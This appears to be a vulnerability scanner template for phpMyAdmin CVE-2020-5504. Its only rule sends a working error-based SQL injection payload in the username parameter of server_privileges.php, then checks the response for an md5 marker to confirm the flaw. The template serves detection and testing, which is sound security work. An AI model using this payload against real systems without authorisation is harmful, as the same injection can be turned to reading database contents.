name: poc-yaml-phpmyadmin-cve-2020-5504
set:
  r: randomInt(800000000, 1000000000)
rules:
  - method: GET
    path: >-
      /server_privileges.php?ajax_request=true&validate_username=true&username=root%27%20and%20(select%20updatexml(1,concat(0x7e,(SELECT%20md5({{r}})),0x7e),1))%20--%20
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r)), 0, 31)))
detail:
  author: pa55w0rd(www.pa55w0rd.online/)
  Affected Version: "phpMyAdmin 4.x versions prior to 4.9.4 are affected, at least as old as 4.0.0. phpMyAdmin 5.x version 5.0.0 is affected."
  links:
    - https://www.phpmyadmin.net/security/PMASA-2020-1/
